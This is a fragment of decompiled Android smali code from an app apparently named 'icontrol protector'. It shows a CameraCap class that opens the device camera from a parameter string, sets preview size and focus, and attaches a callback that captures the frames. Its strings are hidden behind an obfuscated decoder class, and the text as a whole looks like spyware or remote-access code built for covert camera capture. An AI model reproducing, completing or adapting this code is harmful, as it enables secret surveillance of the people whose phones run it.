    :array_5
    .array-data 1
        -0x7dt
        0x13t
        0x35t
        0x76t
        0x3t
        0x4et
        0x72t
        -0xdt
    .end array-data

    :array_6
    .array-data 1
        0x1at
        0x4t
        -0x72t
        0xat
        0x5ct
        -0x37t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x6dt
        0x6dt
        -0x20t
        0x6et
        0x33t
        -0x42t
        -0x36t
        0x7bt
    .end array-data

    :array_8
    .array-data 1
        -0x42t
        -0x9t
        -0x13t
        -0x55t
        -0x6ct
        -0x80t
        -0x74t
        0x4bt
        -0x77t
        -0x9t
        -0xet
        -0x46t
        -0x3at
        -0x79t
        -0x33t
        0x51t
        -0x6ft
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x3t
        -0x6at
        -0x80t
        -0x32t
        -0x1at
        -0x1ft
        -0x54t
        0x38t
    .end array-data

    :array_a
    .array-data 1
        -0x4dt
        0x25t
        0x36t
        0x75t
        0x49t
        -0x8t
        -0x55t
        -0x61t
        -0x62t
        0x64t
        0x2et
        0x63t
        0x5et
        -0x47t
        -0x37t
        -0x71t
        -0x30t
        0x25t
        0x35t
        0x7ft
        0x4ft
        -0xft
        -0x12t
        -0x7ct
        -0x30t
        0x5t
        0x2bt
        0x60t
    .end array-data

    :array_b
    .array-data 1
        -0x10t
        0x44t
        0x5bt
        0x10t
        0x3bt
        -0x67t
        -0x75t
        -0xat
    .end array-data
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    sget-object p1, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    new-instance p2, Lcom/icontrol/protector/CameraCap$b;

    invoke-direct {p2, p0}, Lcom/icontrol/protector/CameraCap$b;-><init>(Lcom/icontrol/protector/CameraCap;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 10

    sget-object v0, Lcom/icontrol/protector/CameraCap;->k:Ljava/lang/String;

    const/4 v1, 0x1

    new-array v2, v1, [B

    const/16 v3, -0x53

    const/4 v4, 0x0

    aput-byte v3, v2, v4

    const/16 v3, 0x8

    new-array v5, v3, [B

    fill-array-data v5, :array_0

    invoke-static {v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    :try_start_0
    aget-object v2, v0, v4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    invoke-static {v2}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v2

    sput-object v2, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    sget-object v2, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    sget-object v5, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v5}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v5

    invoke-virtual {v5}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v5

    const/4 v6, 0x0

    if-eqz v5, :cond_1

    sget-object v5, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v5}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v5

    invoke-virtual {v5}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_0
    :goto_0
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_1

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/hardware/Camera$Size;

    iget v8, v7, Landroid/hardware/Camera$Size;->width:I

    const/16 v9, 0x258

    if-le v8, v9, :cond_0

    iget v8, v7, Landroid/hardware/Camera$Size;->height:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    const/16 v9, 0x190

    if-le v8, v9, :cond_0

    move-object v6, v7

    goto :goto_0

    :cond_1
    :try_start_2
    array-length v5, v0

    if-le v5, v1, :cond_2

    aget-object v1, v0, v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iput v1, v6, Landroid/hardware/Camera$Size;->width:I

    const/4 v1, 0x2

    aget-object v1, v0, v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iput v1, v6, Landroid/hardware/Camera$Size;->height:I

    const/4 v1, 0x3

    aget-object v1, v0, v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iput v1, p0, Lcom/icontrol/protector/CameraCap;->c:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    :try_start_3
    iput v4, v6, Landroid/hardware/Camera$Size;->width:I

    iput v4, v6, Landroid/hardware/Camera$Size;->height:I

    :cond_2
    :goto_1
    iget v1, v6, Landroid/hardware/Camera$Size;->width:I

    if-eqz v1, :cond_3

    iget v1, v6, Landroid/hardware/Camera$Size;->height:I

    if-nez v1, :cond_4

    :cond_3
    const/16 v1, 0x280

    iput v1, v6, Landroid/hardware/Camera$Size;->width:I

    const/16 v1, 0x1e0

    iput v1, v6, Landroid/hardware/Camera$Size;->height:I

    :cond_4
    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v1

    const/16 v4, 0x10

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    new-array v7, v3, [B

    fill-array-data v7, :array_2

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v5}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    new-array v1, v4, [B

    fill-array-data v1, :array_3

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    :cond_5
    const/4 v1, 0x4

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/icontrol/protector/CameraCap;->d:Ljava/lang/String;

    iget v0, v6, Landroid/hardware/Camera$Size;->width:I

    iget v1, v6, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v2, v0, v1}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v0, 0x11

    invoke-virtual {v2, v0}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    sget-object v0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v0, v2}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    sget-object v0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    sget-object p1, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    return-void

    :array_0
    .array-data 1
        -0x7ft
        0x52t
        0x16t
        -0x60t
        0x59t
        0x5at
        -0x4ft
        0x3ct
    .end array-data

    :array_1
    .array-data 1
        0x3t
        -0x2t
        0x17t
        0x13t
        -0x59t
        -0x14t
        0x20t
        -0x5ft
        0x15t
        -0x1et
        0x54t
        0x11t
        -0x59t
        -0x1at
        0x30t
        -0x5ft
    .end array-data

    :array_2
    .array-data 1
        0x60t
        -0x6ft
        0x79t
        0x67t
        -0x32t
        -0x7et
        0x55t
        -0x32t
    .end array-data

    :array_3
    .array-data 1
        -0x60t
        -0xat
        0x2ct
        -0x7t
        0x59t
        -0x43t
        0x28t
        0x7et
        -0x4at
        -0x16t
        0x6ft
        -0x5t
        0x59t
        -0x49t
        0x38t
        0x7et
    .end array-data

    :array_4
    .array-data 1
        -0x3dt
        -0x67t
        0x42t
        -0x73t
        0x30t
        -0x2dt
        0x5dt
        0x11t
    .end array-data
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
